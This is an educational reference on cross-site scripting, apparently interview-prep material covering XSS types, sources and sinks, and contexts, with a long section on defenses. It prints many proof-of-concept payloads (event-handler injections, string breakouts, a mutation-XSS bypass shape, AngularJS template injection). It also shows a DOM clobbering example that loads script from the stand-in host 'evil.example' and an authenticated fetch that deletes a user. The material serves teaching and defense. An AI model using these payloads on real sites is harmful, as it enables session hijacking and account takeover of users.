# Cross-Site Scripting (XSS)

> XSS is a code-versus-data confusion: attacker-controlled bytes reach a browser parser (HTML, JS, URL, or CSS) in a position where the parser treats them as executable rather than inert text. The bug is never "the input was bad," it is "the output was placed into a context without the encoding or sanitization that context requires." Once script runs it inherits the victim's origin, so the real primitive is "arbitrary code execution in the security context of the target site," which subsumes cookie theft, request forgery, credential capture, and DOM rewriting. Everything else in this document is a consequence of that one fact.

## How it works

The browser builds a page through a pipeline of parsers, and each stage has its own grammar and its own set of "dangerous" characters. The HTML tokenizer decides where tags and attributes begin and end. The JavaScript parser decides where a string literal ends and an expression begins. The URL parser decides what a scheme is. XSS happens when untrusted data crosses one of those grammar boundaries.

A minimal reflected sink on the server:

```
https://insecure-website.com/status?message=All+is+well
<p>Status: All is well.</p>
```

If `message` is copied into the response body with no encoding, `?message=<script>alert(1)</script>` lands between tags and the tokenizer opens a real `<script>` element. The fix is not to reject `<`, it is to emit `&lt;` so the tokenizer sees character data.

A minimal DOM sink on the client:

```js
var search = document.getElementById('search').value;
document.getElementById('results').innerHTML = 'You searched for: ' + search;
```

`innerHTML` invokes the HTML fragment parser on a string that includes attacker input. The server may never see the payload at all, which is the defining property of DOM XSS: the taint flows from a client-side source to a client-side sink entirely in the browser.

The mental model that scores in interviews: name the **source** (where untrusted data enters), name the **sink** (the API that interprets it), and name the **context** (the grammar the sink parses). Fix the pair, not the string.

### The four varieties

- **Reflected**: payload is in the current request (query string, path, header) and echoed into the immediate response. Requires luring the victim to a crafted URL or auto-submitting form. One request, one victim, no persistence.
- **Stored (persistent, second-order)**: payload is saved server-side (comment, display name, filename, support ticket, SMTP message, log line) and served to every later viewer. No lure needed, highest blast radius, can be wormable.
- **DOM-based**: the taint flow is client-side only. Server-side filters and WAFs are blind to it because the payload can live in `location.hash` (never sent to the server) or in `document.cookie`, `postMessage`, `localStorage`, `window.name`, or `document.referrer`.
- **Blind**: a stored XSS whose sink you cannot observe (an internal admin dashboard, a SOC log viewer, a CRM ticket screen). You confirm it with an out-of-band callback (a loaded `img`/`fetch` to a server you control, for example with a Burp Collaborator or XSS Hunter style payload) that fires when a privileged user renders your input.

```mermaid
flowchart TD
  subgraph Reflected
    R1[Attacker crafts link, payload in query param] --> R2[Victim clicks link]
    R2 --> R3[Browser sends GET to vulnerable site]
    R3 --> R4[Site reflects unescaped payload in HTML response]
    R4 --> R5[Browser executes payload in site's origin]
  end

  subgraph Stored
    S1[Attacker submits payload once] --> S2[Payload persisted server-side]
    S2 -. later .-> S3[Any victim loads the page normally]
    S3 --> S4[Second, unrelated request reads stored payload]
    S4 --> S5[Server renders payload into HTML response]
    S5 --> S6[Browser executes payload in site's origin]
  end

  subgraph DOMBased["DOM-based"]
    D1[Victim clicks link, payload in URL fragment] --> D2[Browser loads page normally, server never sees the fragment]
    D2 --> D3[Client-side JS reads location.hash]
    D3 --> D4[JS writes value into innerHTML, an unsanitized sink]
    D4 --> D5[Payload executes purely client-side]
  end

  classDef atk fill:#fee,stroke:#900
  class R1,S1,D1 atk
```

### Sources and sinks (DOM XSS)

Common **sources** (attacker-influenced): `location` and its parts (`location.href`, `location.search`, `location.hash`, `location.pathname`), `document.URL`, `document.referrer`, `window.name`, `document.cookie`, `postMessage` event `data`, `localStorage`/`sessionStorage`, and reflected/stored values the server injected into a JS variable.

Common HTML **sinks** (parse a string as markup): `element.innerHTML`, `element.outerHTML`, `element.insertAdjacentHTML`, `document.write`, `document.writeln`, `iframe.srcdoc`, `Range.createContextualFragment`, and jQuery methods `html()`, `append()`, `prepend()`, `before()`, `after()`, `wrap()`, plus the `$()` selector and `$.parseHTML()`.

Common JavaScript-execution **sinks**: `eval`, `Function()`, `setTimeout`/`setInterval`/`setImmediate` when passed a string, `location`/`location.href`/`location.assign`/`location.replace` (allows the `javascript:` scheme), `script.src`, `script.text`, `a.href`, and `element.setAttribute` on an event-handler or URL attribute.

**Framework escape hatches** are sinks in disguise, and every one deserves a line in a code review:

- React `dangerouslySetInnerHTML={{__html: userInput}}`, plus `href={userInput}` allowing `javascript:` (React does not sanitize URL schemes) and `ref` callbacks that touch the raw DOM.
- Angular `bypassSecurityTrustHtml` / `bypassSecurityTrustUrl` / `bypassSecurityTrustScript` / `bypassSecurityTrustResourceUrl` (they switch off Angular's built-in sanitizer), and legacy AngularJS template interpolation `{{ }}` under `ng-app`.
- Vue `v-html`.
- Svelte `{@html userInput}`.
- Lit `unsafeHTML()`; Polymer `inner-h-t-m-l`.

### Why context decides everything

The same string is safe in one context and lethal in the next, because each parser decodes differently. HTML-encoding a value that lands in a `<script>` block does nothing, because the JS parser never HTML-decodes. This is the single most common false-safety bug: one encoder applied to all outputs.

## Attack techniques

### 1. HTML body context (inject a new element)

Data lands between tags: `<div>DATA</div>`. Inject a tag that runs script. Modern browsers do not execute `<script>` inserted via `innerHTML`, and `svg onload` does not fire through `innerHTML`, so the reliable primitives are elements with event handlers:

```html
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>
<iframe src="javascript:alert(document.domain)">
```

Why it works: the tokenizer opens a real element; `onerror`/`onload` are parsed as event-handler content attributes and the JS runs when the load fails or completes. Detection: reflect a unique marker like `zqx123`, then `zqx123<u>` and confirm the `<u>` renders as a real element in the live DOM (DevTools, not "View Source").

Note on PoC choice: since Chrome 92 (July 2021) cross-origin iframes cannot call `alert()`, so PortSwigger labs and many real reports use `print()` as the marker instead.

### 2. HTML attribute context (break out or add a handler)

Data lands inside an attribute value: `<input value="DATA">`. Quoted attribute: close the quote and add a handler:

```html
"><script>alert(1)</script>
" autofocus onfocus=alert(1) x="
```

Unquoted attribute (`<input value=DATA>`) needs only whitespace to add a new attribute, no quote required:

```html
x onmouseover=alert(1)
```

Some attributes are dangerous even without breaking out. In an `href`/`src`, a `javascript:` value executes on click/load; in a legacy `style` attribute, `expression()` ran on old IE. Detection: inject a `"` and a `'` and observe whether either survives unencoded into the attribute.

### 3. JavaScript string context (break the string, or the script element)

Data lands inside a quoted JS string: `<script>var x = 'DATA';</script>`. Three distinct breakouts:

Break the string literal, then run code and comment out the tail:

```js
'; alert(1); //
```

Break the whole script element (the HTML tokenizer wins over the JS parser, so a literal `</script>` closes the block even mid-string):

```html
</script><script>alert(1)</script>
```

Abuse HTML-decoding of event-handler attributes: inside an inline handler the browser HTML-decodes the attribute before handing it to the JS parser, so entities become live syntax:

```html
<a href="#" onclick="var x='&#39;;alert(1)//'">click</a>
```

**Template literal context** is special: if the data lands inside backticks, you do not even need to break out of the string, because `${...}` is evaluated:

```js
`Hello ${alert(document.domain)}`
```

Detection: this is the context where you must trace with the JS debugger, because a value routed through `eval('var data="REFLECTED"')` may never appear in the DOM tree at all.

### 4. URL context (the javascript: scheme)

Data becomes a URL used by `href`, `src`, `location`, `window.open`, or an `<iframe>`:

```
javascript:alert(document.domain)
```

A classic DOM instance via jQuery `attr()`:

```js
$('#backLink').attr('href', new URLSearchParams(location.search).get('returnUrl'));
```

```
?returnUrl=javascript:alert(document.domain)
```

Why it works: the anchor's `href` is set to a `javascript:` URL and clicking navigates to it, running the script. Defense here is scheme allowlisting (`http`/`https`/`mailto` only), not encoding, because the value is a syntactically valid URL.

### 5. CSS context

Data lands in a style value. Legacy `expression()` (old IE) ran JS; modern impact is data exfiltration via `url()` and attribute-selector-driven leaks (CSS injection reading tokens character by character). Rarely direct script execution today but still an injection to close off.

### 6. Mutation XSS (mXSS)

The HTML fragment parser is not a pure function: reading `element.innerHTML` **re-serializes** the DOM, and re-parsing that serialization can "heal" or transform markup into something that executes, even after a sanitizer approved the intermediate string. The canonical academic reference is Heiderich, Schwenk, Frosch, Magazinius, and Wang, "mXSS Attacks: Attacking well-secured Web-Applications by using innerHTML Mutations" (ACM CCS 2013).

The mechanics that produce mutations:

- **Foreign content** (`<svg>`, `<math>`): inside these subtrees the parser uses a different content model, so an element that was inert as text becomes an HTML integration point on re-parse. Michał Bentkowski's DOMPurify bypasses used nested `<form>`, `<math>`, and `<svg>` to smuggle payloads through a round-trip.
- **Attribute and tag normalization**: the serializer can drop or move quotes and namespaces, turning `<a "><img src=x onerror=...>` style constructs into working markup after a second parse.
- **noscript, template, and CDATA quirks**: parsing rules differ depending on whether scripting is enabled, so the same string yields different trees.

Realistic sanitizer-bypass shape (structure, not a working 0-day):

```html
<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">
```

Why mXSS matters in interviews: it is the reason you must never hand-roll a regex sanitizer and must never sanitize-then-mutate. Sanitize with a library that models the parser (DOMPurify) and do not touch the string afterward, because any later `innerHTML` round-trip can re-introduce the vulnerability.

### 7. Framework and library gadgets

- jQuery `CVE-2020-11022` and `CVE-2020-11023`: passing HTML from an untrusted source to jQuery DOM-manipulation methods could execute code even after some sanitization, due to `htmlPrefilter` regex mutation (fixed in 3.5.0). `CVE-2015-9251`: jQuery cross-domain AJAX with no `dataType` could execute a `text/javascript` response.
- jQuery `$(location.hash)` selector: historically a DOM XSS staple. Newer jQuery blocks selectors starting with `#`, but the `$()` sink is still exploitable when you fully control input from a source that does not require a `#` prefix. Triggering `hashchange` without user interaction:

```html
<iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=alert(1)>'">
```

- AngularJS (`ng-app` present): `{{constructor.constructor('alert(1)')()}}` style client-side template injection executes without angle brackets or event handlers, and sandbox escapes (documented by Gareth Heyes, Mario Heiderich, and Jann Horn) removed the old 1.x sandbox entirely.

### 8. Turning self-XSS into real impact

Self-XSS (you can only run script in your own session, for example pasting into a field only you see) is not a vulnerability by itself. The interview point is that self-XSS is a *delivery* problem, and delivery is solvable:

- **Chain with CSRF**: if the action that stores the payload lacks CSRF protection, forge a cross-site request that plants your payload into the *victim's* profile. It is now stored XSS firing in their session.
- **Login CSRF / forced login**: force the victim into an attacker-controlled account that already contains the self-XSS payload, so the script runs and captures whatever the victim then types or does.
- **Re-test as reflected/DOM**: if the "self" field is actually reachable through a URL, `postMessage`, or hash you can send, it was never self-XSS.

### 9. What you do after code executes

Because script runs in the victim's origin, the impact is not "steal the cookie," it is "become the user's browser":

- Read the CSRF token from the page and then submit the state-changing request yourself: XSS *defeats* CSRF tokens, because same-origin script can read them.
- `HttpOnly` blocks `document.cookie` reading but does **not** stop authenticated requests: `fetch('/admin/deleteUser', {method:'POST', credentials:'include'})` runs with the victim's cookies regardless.
- Exfiltrate non-`HttpOnly` cookies, capture keystrokes and credentials, rewrite the DOM for phishing, pivot to internal same-origin endpoints, hook the browser (BeEF), and self-propagate through stored contexts (the Samy worm, MySpace, October 2005, by Samy Kamkar added over a million friends in under a day using stored XSS that re-posted itself).

### 10. DOM Clobbering

DOM Clobbering turns HTML-only injection (no `<script>`, no event handlers, no `javascript:` URL) into script execution by exploiting a browser rule most developers do not think about: named `id` and `name` attributes on HTML elements automatically create properties on `document` and `window`. A sanitizer that strips scripts and event handlers but permits `<a>`, `<form>`, `<input>`, `<img>`, and their `id`/`name` attributes leaves the class wide open.

The primitive: `<a id="x">` makes `document.x` reference that element, and `window.x` follows. A form clobber like `<form id="config"><input name="url" value="//evil.example/xss.js">` makes `config.url` resolve to an HTMLInputElement whose `.value` the attacker controls. Any JS that later reads a global or a config lookup, treats a "trusted" object property as safe, or uses `document.currentScript`-style patterns, can be redirected. A concrete exploit shape: an app that lazy-loads a plugin via `var s = document.createElement('script'); s.src = config.pluginUrl; document.head.appendChild(s);` where `config` is a global will fetch attacker-controlled JS after an injected form clobbers `config`.

Chains include hijacking script `src` in `document.currentScript`-style patterns, defeating allowlist checks that read `window.someObj`, and bypassing "is this URL safe" helpers that walk a property path. Gareth Heyes documented the class in depth and DOMPurify added `SANITIZE_DOM` and `SANITIZE_NAMED_PROPS` options to reject IDs and names that collide with built-ins or with existing globals.

The interview point is that a sanitizer that allows `id`/`name` is not sufficient. Read configuration from a closure-scoped object rather than a global that HTML can shadow, prefer `Object.create(null)` bags over `window` properties, and turn on `SANITIZE_NAMED_PROPS` when you must accept authored HTML.

### 11. Stored XSS via user-uploaded files (SVG and friends)

Stored XSS is not only text fields. Any file the application accepts and later serves from its own origin is a potential sink, and SVG is the canonical example because SVG is XML that may contain `<script>` or event-handler attributes. When an uploaded SVG is served with `Content-Type: image/svg+xml` and the victim navigates directly to `https://app.example/uploads/logo.svg`, the browser parses it as an XML document, opens the script element, and runs it in the app's origin with the app's cookies.

The same class covers uploaded HTML and XHTML files, PDFs served inline (some PDF viewers run JS), and, on browsers that sniff, `text/plain` or `application/octet-stream` responses whose bodies begin with `<html>` or `<script>`. Note that `<img src=logo.svg>` does not execute the script (image context suppresses scripting), but a direct navigation, an `<object>`, or an `<iframe>` embed does.

Defenses stack. Serve user-uploaded content from a separate sandbox origin (`usercontent.example.com` distinct from `app.example`) so any script that fires runs in an origin with no cookies and no access to the main app. Force `Content-Disposition: attachment` for arbitrary uploads so the browser downloads rather than renders. Strip scripts and event handlers from SVG with DOMPurify's SVG profile before storage. Send `X-Content-Type-Options: nosniff` and a precise `Content-Type`. Never let user uploads inherit a path under the main app origin.

### 12. postMessage handlers without strict origin checks

`postMessage` is a DOM XSS source that is easy to get wrong because the platform gives you `event.origin` but does not force you to check it. A handler like this is exploitable by any page that can open or iframe the target:

```js
window.addEventListener('message', e => {
  document.body.innerHTML = e.data;
});
```

The attacker page opens a popup or iframe of the victim and calls `victim.postMessage('<img src=x onerror=alert(1)>', '*')`. No origin check ran, so the payload lands in `innerHTML`. Common wrong fixes make the bug look fixed while leaving it open: checking `event.source` alone (the attacker controls the frame reference used for the check), `origin.indexOf('trusted.com') !== -1` (matches `trusted.com.evil.com` and `evil.com/?x=trusted.com`), or a regex without `^` and `$` anchors.

The correct pattern is strict equality against a small allowlist of origin strings, treat `e.data` as untrusted even from a trusted origin (postMessage relays and open framing paths let attacker data ride on a trusted sender), never route `e.data` into an HTML or script sink, and prefer a structured schema (JSON with a fixed shape and a version field) over free-form strings. When you ship a legitimate postMessage API, publish the target origins and the message schema alongside the handler.

### 13. Prototype pollution as an XSS gadget

Client-side prototype pollution is a separate class of bug (an unsafe merge, clone, or query-string-to-object utility writes attacker keys onto `Object.prototype`), but it becomes an XSS primitive when a downstream library reads its own configuration through property lookups that fall through to the prototype. The attacker never touches the sanitizer directly, only the sanitizer's config.

Documented gadgets include DOMPurify's `ALLOWED_ATTR`/`ALLOWED_TAGS` being widened through prototype (so an event-handler attribute the app never intended to allow gets through), jQuery's `$.extend`-driven option handling picking up prototype-polluted defaults, and template engines that consult `Object.prototype` for helper lookups or partials paths. A single polluted key can turn a sanitizer from a defense into a passthrough.

Defenses are layered. Use `Object.create(null)` for config bags so there is no prototype to pollute in the first place. Freeze prototypes early (`Object.freeze(Object.prototype)` where library compatibility permits). Validate that merge/clone utilities reject `__proto__`, `constructor`, and `prototype` keys, or replace them with `structuredClone`. Keep client libraries patched, because new sink gadgets are still being found. The interview point is that "we sanitize HTML" is not sufficient when the sanitizer's own configuration is attacker-influenced through a separate class of bug.

## Defense

Ordered by effectiveness. Real fix first, defense-in-depth after.

1. **Contextual output encoding at the point of output.** Encode for the *specific* grammar the data lands in: HTML entity encoding in body/attribute contexts (`& < > " '`), JavaScript `\uXXXX` Unicode escaping inside JS string literals, URL percent-encoding for URL parameters, CSS hex escaping in style values. Never reuse one encoder across contexts. There are "dangerous contexts" where encoding cannot save you (directly inside `<script>`, inside HTML comments, in a tag/attribute name, in `javascript:` URLs): do not put untrusted data there at all.

2. **Let the framework auto-escape, and treat every escape hatch as a review gate.** React, Angular, and modern template engines auto-escape interpolated values, which eliminates most XSS by default. The residual risk is entirely in `dangerouslySetInnerHTML`, `v-html`, `bypassSecurityTrust*`, `{@html}`, raw `innerHTML`, and `href={userInput}` with a `javascript:` scheme. Ban these with lint/Semgrep rules and require a security sign-off on each use.

3. **Sanitize HTML you genuinely must render** (WYSIWYG output) with a vetted, mutation-aware library: **DOMPurify** (`DOMPurify.sanitize(dirty)`). Never a hand-rolled blocklist or regex. Allowlist tags and attributes, keep the library patched (browser parser changes create new bypasses), and never mutate the string after sanitizing.

4. **Prefer safe sinks.** Use `textContent` over `innerHTML`, `setAttribute` with a hardcoded safe name, `element.className`, `formfield.value`, `document.createTextNode`, and `window.encodeURIComponent` for URL construction. Do not pass strings to `eval`/`Function`/`setTimeout`.

5. **Trusted Types** (Chromium) to eliminate DOM XSS as a class: `Content-Security-Policy: require-trusted-types-for 'script'`. DOM sinks (`innerHTML`, `outerHTML`, `document.write`, `script.src`) then reject plain strings and only accept values minted by a vetted policy, converting DOM XSS into an enforced, testable error instead of a runtime exploit. Ship a default policy that routes legacy paths through DOMPurify.

6. **Strict Content Security Policy** as the last line of defense, not a substitute for encoding. A holding configuration is nonce- or hash-based with `strict-dynamic`, no `unsafe-inline`, no `unsafe-eval`, `object-src 'none'`, and `base-uri 'none'`:

```
Content-Security-Policy: script-src 'nonce-r4nd0m' 'strict-dynamic'; object-src 'none'; base-uri 'none'
```

7. **Cookie hardening and validated input** as supporting layers: `HttpOnly` (limits cookie theft, not request forgery), `Secure`, `SameSite`, plus allowlist input validation where the format is known. Neither is sufficient alone. Per OWASP, a WAF is not an XSS control (it misses DOM XSS entirely and is routinely bypassed).

8. **`X-Content-Type-Options: nosniff` on every response, precise `Content-Type` on every endpoint.** The invariant enforced is that a response body is interpreted only as the type the server declared. Without `nosniff`, browsers historically inspected response bodies and could treat a `text/plain` or `application/octet-stream` response beginning with `<html>` or `<script>` as HTML or JavaScript, turning any endpoint that reflects user bytes (error pages, JSON endpoints served without a JSON content type, uploaded files) into an XSS sink. Why it works: MIME sniffing is the browser's fallback when it does not trust the server's type; declaring the type authoritatively and forbidding sniffing removes the fallback. A common wrong implementation is setting `nosniff` on HTML responses only. It has to be on every response, including uploads, JSON APIs, and static file handlers, and `nosniff` also blocks script and style responses served without the matching type from executing, which shuts down JSONP-adjacent gadgets.

9. **Sandboxed iframes for rendering untrusted HTML.** The invariant enforced is that a sanitizer bypass cannot reach the app's origin. Render user-supplied HTML inside `<iframe sandbox srcdoc="...">` and omit `allow-same-origin` so scripts, forms, popups, and same-origin DOM access are disabled by default, or serve the content from a separate sandbox domain (`usercontent.example.com`) so any script that escapes sanitization runs in an origin with no cookies and no access to the app's DOM. Why it works: the browser enforces the sandbox at the origin boundary, and origin-level isolation survives the class of parser bugs that break sanitizers. This is how GitHub renders README HTML and how Google Docs isolates embedded content. A common wrong implementation is `sandbox` with `allow-same-origin allow-scripts` together, which the spec explicitly warns removes the sandbox's protection because the framed page can call out to remove the sandbox attribute from its parent. It is the structural answer to "a sanitizer bypass is one commit away, what else do you have."

### CSP as mitigation, and why CSP is often bypassable

CSP reduces the impact of an XSS that already exists; it does not fix the bug. The Google study "CSP Is Dead, Long Live CSP" (Weichselbaum, Spagnuolo, Lekies, Janc, ACM CCS 2016) found the overwhelming majority of real-world policies trivially bypassable. The reasoning an expert gives:

- **Self-defeating directives**: `unsafe-inline`, `unsafe-eval`, `data:` in `script-src`, or a broad `*`/`https:` source largely nullify the policy.
- **Allowlisted-host gadgets**: if the policy allows a host you can place content on (a CDN without per-customer paths like `ajax.googleapis.com`, an open JSONP endpoint, or a hosted copy of AngularJS), you load or bootstrap your script from that trusted origin. `strict-dynamic` exists precisely to abandon host allowlists in favor of nonce propagation.
- **Missing `base-uri`**: inject `<base href>` to hijack relative script URLs. **`object-src` not `none`**: plugin/embed vectors.
- **Nonce mistakes**: reused, static, or guessable nonces, or DOM injection *before* a legitimately nonced script so the browser reuses that nonce.
- **Policy injection**: if the app reflects input into the policy (often a `report-uri`), inject a `;` to add directives; Gareth Heyes' PortSwigger research used the newer `script-src-elem` directive to overwrite an existing `script-src`.

## Interview-grade nuances

- "Input validation prevents XSS": no, contextual **output** encoding is the fix. Validation is defense-in-depth and many legitimate values contain `<` (a math forum, a code snippet field).
- "HttpOnly stops XSS": it stops `document.cookie` reads. The attacker still runs code and still makes authenticated requests as the victim.
- "React is XSS-proof": until `dangerouslySetInnerHTML`, a `javascript:` URL in `href`, or direct DOM manipulation via `ref`.
- "We encode everything": encoding the same way everywhere is itself the bug. HTML-encoding inside a `<script>` block or a `javascript:` URL does nothing.
- "It is only self-XSS, not exploitable": chainable via CSRF or forced login into stored XSS in the victim's session.
- "The WAF blocks XSS": WAFs are blind to DOM XSS (the payload can be in `location.hash`, never sent to the server) and are routinely evaded.
- Browser URL-encoding of sources differs: Chrome, Firefox, and Safari URL-encode `location.search` and `location.hash`, which can neutralize some payloads, so test the exact target browser.
- The correct threat framing is capability, not payload: once script runs in the origin, assume full compromise of that user's interaction, then scope impact by the user's privilege.

## Sources

- PortSwigger, Cross-site scripting: https://portswigger.net/web-security/cross-site-scripting
- PortSwigger, Reflected XSS: https://portswigger.net/web-security/cross-site-scripting/reflected
- PortSwigger, DOM-based XSS: https://portswigger.net/web-security/cross-site-scripting/dom-based
- PortSwigger, Content security policy: https://portswigger.net/web-security/cross-site-scripting/content-security-policy
- PortSwigger, XSS cheat sheet (contexts and payloads): https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
- PortSwigger Research, Bypassing CSP with policy injection (Gareth Heyes): https://portswigger.net/research/bypassing-csp-with-policy-injection
- PortSwigger Research, DOM Clobbering strikes back (Gareth Heyes): https://portswigger.net/research/dom-clobbering-strikes-back
- OWASP, XSS Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
- OWASP, DOM-based XSS Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html
- OWASP, File Upload Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html
- DOMPurify (cure53): https://github.com/cure53/DOMPurify
- Heiderich et al., mXSS Attacks (ACM CCS 2013): https://cure53.de/fp170.pdf
- Weichselbaum, Spagnuolo, Lekies, Janc, CSP Is Dead, Long Live CSP (ACM CCS 2016): https://research.google/pubs/pub45542/
- Google, Trusted Types: https://web.dev/articles/trusted-types
- Google, CSP Evaluator: https://csp-evaluator.withgoogle.com/
- MDN, Window.postMessage: https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage
- MDN, iframe sandbox attribute: https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe#sandbox
- MDN, X-Content-Type-Options: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options
- Client-Side Prototype Pollution (BlackFan gadgets list): https://github.com/BlackFan/client-side-prototype-pollution
